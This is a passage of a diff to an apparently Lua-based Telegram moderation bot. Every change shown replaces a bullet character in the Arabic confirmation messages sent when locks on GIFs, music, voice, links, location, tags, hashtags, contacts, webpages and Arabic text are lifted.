                   send(msg.chat_id_, msg.id_, 1, '_> gifs is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5421,14 +5124,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المتحركه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المتحركه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:gifs:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> gifs ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5437,14 +5140,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المتحركه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المتحركه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:gifs:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> gifs warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المتحركه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5453,14 +5156,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الاغاني `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الاغاني `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:music:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5469,14 +5172,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الاغاني `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الاغاني `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:music:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5485,14 +5188,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الاغاني `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الاغاني `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:music:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الاغاني` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5501,14 +5204,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصوتيات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصوتيات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:voice:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5517,14 +5220,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصوتيات `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصوتيات `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:voice:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5533,14 +5236,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصوتيات `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصوتيات `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:voice:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصوتيات` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5549,14 +5252,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الروابط `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الروابط `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:links:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5565,14 +5268,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الروابط `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الروابط `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:links:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5581,14 +5284,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الروابط `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الروابط `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:links:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الروابط` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5597,14 +5300,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشبكات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشبكات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:location:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5613,14 +5316,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشبكات `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشبكات `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:location:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5629,14 +5332,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشبكات `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشبكات `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:location:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشبكات` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end 
       end
@@ -5645,14 +5348,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المعرفات <@> `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المعرفات <@> `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:tag:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5661,14 +5364,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المعرفات <@> `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المعرفات <@> `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:tag:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5677,14 +5380,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المعرفات <@> `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المعرفات <@> `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:tag:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المعرفات <@>` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5693,14 +5396,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التاكات <#> `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التاكات <#> `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:hashtag:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5709,14 +5412,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التاكات <#> `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التاكات <#> `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:hashtag:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5725,14 +5428,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التاكات <#> `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التاكات <#> `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:hashtag:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التاكات <#>` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5741,14 +5444,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح جهات الاتصال `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح جهات الاتصال `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:contact:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5757,14 +5460,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح جهات الاتصال `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح جهات الاتصال `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:contact:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5773,14 +5476,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح جهات الاتصال `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح جهات الاتصال `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:contact:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح جهات الاتصال` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5789,14 +5492,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المواقع `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المواقع `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:webpage:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5805,14 +5508,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المواقع `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المواقع `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:webpage:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5821,14 +5524,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المواقع `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المواقع `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:webpage:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح المواقع` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
     end
@@ -5837,14 +5540,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح العربيه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح العربيه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:arabic:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5853,14 +5556,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح العربيه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح العربيه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:arabic:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
